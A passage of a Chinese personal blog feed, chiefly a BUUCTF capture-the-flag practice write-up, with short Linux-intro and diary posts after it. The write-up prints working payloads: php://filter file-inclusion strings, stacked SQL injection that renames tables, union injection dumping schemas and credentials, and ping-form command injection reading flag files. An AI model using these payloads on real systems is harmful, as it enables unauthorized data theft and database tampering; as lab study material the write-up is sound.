href="http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86">http://49122460-5b04-4fd8-b15c-e5fad13e769c.node4.buuoj.cn:81/?cat=dog就可以了</a>~</p><hr><h2 id="4-ACTF2020-新生赛-Include"><a href="#4-ACTF2020-新生赛-Include" class="headerlink" title="4.[ACTF2020 新生赛]Include"></a>4.[ACTF2020 新生赛]Include</h2><p>从题目可以看出来考察的是文件包含，进入题目看到tip，点击，网页进行了跳转，此时发现url为：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948714.png"></p><p>可以看到后面有get型参数file值传入，此时传入参数后回显为这句话，那我们就直接通过==<strong>php://filter伪协议</strong>==读取整个flag.php，构造payload为：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948715.png"></p><p>可以看到有一串base64加密的编码，解密后得到flag：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Can you find out the flag?"</span><span class="token punctuation">;</span><span class="token comment">//flag{0f1d073a-d716-4aa6-ae19-16dbba744a1d}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="5-强网杯-2019-随便注"><a href="#5-强网杯-2019-随便注" class="headerlink" title="5.[强网杯 2019]随便注"></a>5.[强网杯 2019]随便注</h2><p>从题目知应该是SQL注入，进入题目看到有一个输入框，输入 1 ，正常返回，加个<strong>单引号 1’</strong> 返回SQL语句错误，即存在SQL注入</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948716.png"></p><p>然后使用order by 2,order by 3 查看列数，发现<strong>只有两列</strong></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948717.png"></p><p>尝试使用联合查询union select 发现回显语是<strong>select被正则过滤</strong>了</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948718.png"></p><p>emmm,开始大小写、联合注释等绕过waf,但是没得用就很气呦……，后来查了下资料原来是忽略掉的<font color="#FF5E3A" size="4">堆叠注入！</font>，那就开始直接查看表名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show tables; --+//在SQL中，分号（;）是用来表示一条sql语句的结束。堆叠注入就是结束一个sql语句后，会继续执行下一条构造的SQL语句。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948719.png"></p><p>然后对应查看对应的列名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from words; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948720.png"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';show columns from `1919810931114514`; --+   //字符串为表名操作时要加反引号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948721.png"></p><p>这里可以看到我们要的flag是在对应的表中，根据第一次输入 1 的结果来看后台的语句应该是:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from words where id = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我们目前最重要的就是从另一个表中获得数据，但是我们只能从 “word” 这个表里取数据，然后看了别人的文章发现还可以<strong>改表的名称</strong>来读flag! 所以，思路就很清晰了：</p><ol><li>更改表的名称。将words改为随便其他的名字比如words1，然后将”1919810931114514”表的名字替换为words</li><li>给新的words表增加一列id</li></ol><p>构造payload为（提醒：<font color="#FF5E3A" size="4"> 字符串为表名操作时要加反引号！！！</font>）：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; --+//这里使用了rename和alert，具体用法可以查一下，不在正则过滤的范围内//注意一定要使用反引号！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接着再查看下表，其实就已经查出来flag了，啊tql，学到了~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948722.png"></p><p>最后感谢有人复现让我学习：<a href="https://github.com/CTFTraining/qwb_2019_supersqli">https://github.com/CTFTraining/qwb_2019_supersqli</a></p><hr><h2 id="6-SUCTF-2019-EasySQL"><a href="#6-SUCTF-2019-EasySQL" class="headerlink" title="6.[SUCTF 2019]EasySQL"></a>6.[SUCTF 2019]EasySQL</h2><p>这题给我整不会了，刚开始试了联合不行，也没报错，报错注入也没了，布尔、时间也不得行了，又是看别人解题的一次，原来还可以猜后端代码:惊恐:。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select $_GET['query'] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后构造payload为：*,1(或者其他常数)</p><p>我接着自己在本地的test数据库尝试了一下，直接构造：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select 1 from salaries;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042456.png" style="zoom:150%;"><p>确实<strong>直接 select 一个常数会直接新增一个临时的列，并且每一行的数值都是这个常数</strong>，再来说一下这个 || ，在mysql里，<strong>只要 || 前面的成立，后面的便不再执行</strong>，同理，前面的不成立会执行后面的 。如果我们直接构造 :</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042458.png"></p><p>可以看到会报语法错误，所以最终就是大佬的构造方法：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select *,1||salary from salaries<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042459.png" style="zoom:150%;"><p>可以看到新增加了一列并且这个表中的数据也都显示出来了，大佬们牛批！最后解题拿flag：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042460.png" style="zoom:150%;"><h2 id="7-ACTF2020-新生赛-Exec"><a href="#7-ACTF2020-新生赛-Exec" class="headerlink" title="7.[ACTF2020 新生赛]Exec"></a>7.[ACTF2020 新生赛]Exec</h2><p>考察的是<strong>远程命令执行</strong>，emm我也是第一次做这种题，百度了一下网站的ping漏洞，发现可能存在远程执行命令的漏洞，就开始尝试~</p><p>首先讲几个知识点：</p><ul><li><p><strong>命令连接符</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cmd1 <span class="token punctuation">;</span> cmd2 <span class="token punctuation">;</span> cmd3         分号 <span class="token punctuation">;</span> 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行cmd1 <span class="token operator">&amp;&amp;</span> cmd2               左边的command1执行成功<span class="token punctuation">(</span>返回0表示成功<span class="token punctuation">)</span>后，  <span class="token operator">&amp;&amp;</span>  右边的command2才能被执行。cmd1 <span class="token operator">|</span> cmd2                <span class="token operator">|</span> 表示管道，上一条命令的输出，作为下一条命令的输入cmd1 <span class="token operator">||</span> cmd2               <span class="token operator">||</span> 表示上一条命令执行失败后，才执行下一条命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>下面开始做题：</p><p>首先<code>ls</code>查看一下当前目录有没有flag文件等，发现没得：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042461.png"></p><p>然后尝试遍历父目录可以看到有flag文件：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042462.png"></p><p>这样直接<code>cat ../../../flag</code>拿到flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171042463.png"></p><h2 id="8-极客大挑战-2019-Secret-File"><a href="#8-极客大挑战-2019-Secret-File" class="headerlink" title="8.[极客大挑战 2019]Secret File"></a>8.[极客大挑战 2019]Secret File</h2><p>考察的是<strong>伪协议读取文件</strong>，难点就是怎么读到flag.php中的flag。</p><p>进入题目查看源代码发现提示有：/Archive_room.php ，接着点发现有：/action.php ，但是访问直接过去了跳到：/end.php，开始抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145471.png"></p><p>发现有secr3t.php，访问之后看到一段代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token prolog">&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flag放在了flag.php里?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接访问flag.php会出现贱贱的话，看不到flag，看到php代码里有过滤的，先解释下这两个函数：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">strstr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>搜索字符串在另一字符串中的第一次出现。返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 <span class="token boolean constant">FALSE</span>。 <span class="token function">stristr</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>search<span class="token punctuation">,</span>before_search<span class="token punctuation">)</span>    不区分大小写的strstr（）版本。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到过滤了input、data，是伪协议里的，那就考虑filter读取文件，构造payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面返回flag.php的源码，解密后看到flag：<code>flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2}</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145473.png"></p><h2 id="9-极客大挑战-2019-LoveSQL"><a href="#9-极客大挑战-2019-LoveSQL" class="headerlink" title="9.[极客大挑战 2019]LoveSQL"></a>9.[极客大挑战 2019]LoveSQL</h2><p>考察联合注入:</p><p>首先在username处输入<code>1'</code>,password输个1，发现语法报错，即存在sql注入。接着先查看一下字段数：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 4 #   报错1' order by 3 #   无报错，说明三个字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后试下联合查询爆破所有数据库：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050615.png"></p><p>看到有geek，大概率就是他了，接下来查看表名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050616.png"></p><p>接着试试查看l0ve1ysq1表里的列名：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050617.png"></p><p>最后就可以直接拿数据了：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag{fbee60d0-759c-4012-a59b-bc0509fa5431}。</p><h2 id="10-GXYCTF2019-Ping-Ping-Ping"><a href="#10-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="10.[GXYCTF2019]Ping Ping Ping"></a>10.[GXYCTF2019]Ping Ping Ping</h2><p>又是一道命令执行漏洞的题目，不过存在了很多过滤，自己试了多种方法也不得行，看了一个师傅的博客学到了,tql，直接贴链接吧：</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187</a></p><hr><p>刷了十道题咧，哎，还是太菜了，不果慢慢有节奏了，慢慢学吧~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948723.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习-第一章</title>
      <link href="/posts/myh10002.html"/>
      <url>/posts/myh10002.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第一章：初识Linux"><a href="#第一章：初识Linux" class="headerlink" title="第一章：初识Linux"></a>第一章：初识Linux</h2><h3 id="1-1-shell"><a href="#1-1-shell" class="headerlink" title="1.1 shell"></a>1.1 shell</h3><p>​         Linux shell是一种特殊的<font color="#FF5E3A" size="4">交互式工具</font>。它为用户提供了启动程序、管理文件系统中的文件以及运行在Linux系统上的进程的途径。 shell的<font color="#FF5E3A" size="4">核心是命令行提示符</font>。命令行提示符是shell负责交互的部分。它允许你<strong>输入文本命令，然后解释命令，并在内核中执行</strong>。  </p><p>​        shell包含了一组内部命令，用这些命令可以完成诸如复制文件、移动文件、重命名文件、显示和终止系统中正运行的程序等操作。 shell也允许你在命令行提示符中输入程序的名称，它会将程序名传递给内核以启动它。</p><p>​        也可以将<strong>多个shell命令放入文件中</strong>作为程序执行，这些文件被称作<strong>shell脚本</strong>。你在命令行上执行的任何命令都可放进一个shell脚本中作为一组命令执行。这为创建那种需要把几个命令放在一起来工作的工具提供了便利。</p><p>​        linux有好几种版本的shell，默认的是bash shell。</p><h3 id="1-2-Linux系统分类"><a href="#1-2-Linux系统分类" class="headerlink" title="1.2 Linux系统分类"></a>1.2 Linux系统分类</h3><p>​        Linux主要的系统可以分为两类：<strong>Debian</strong>和<strong>Redhat</strong>，话有一些其他的自由发布的版本。</p><p>​        Debian系列主要有Debian、Ubuntu等。</p><p>​        Redhat系列主要有Redhat、CentOs等。</p><p>​        <strong>不同的系统版本某些命令可能是不一样的</strong>，比如 Debian 使用 <font color="#FF5E3A" size="4">apt-get</font>来安装包，但CentOs使用 <font color="#FF5E3A" size="4">yum</font>。</p><hr><p>第一张就是简要介绍一下什么是linux shell以及常见的发行版本。下一章，将详细讲解shell的使用。</p><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux1/202201150952192.jpg" alt="hello">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透学习</title>
      <link href="/posts/myh10001.html"/>
      <url>/posts/myh10001.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/posts/myh10000.html"/>
      <url>/posts/myh10000.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><p>hello，这是我的第一篇博客,以后这里会记录我的日常生活和学习!</p><p>大概更新的学习内容会有CTF，渗透，机器学习，python，Java的相关知识，期待您的来访~</p><hr><img src="/images/1.png" alt="hello" style="zoom:55%;">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
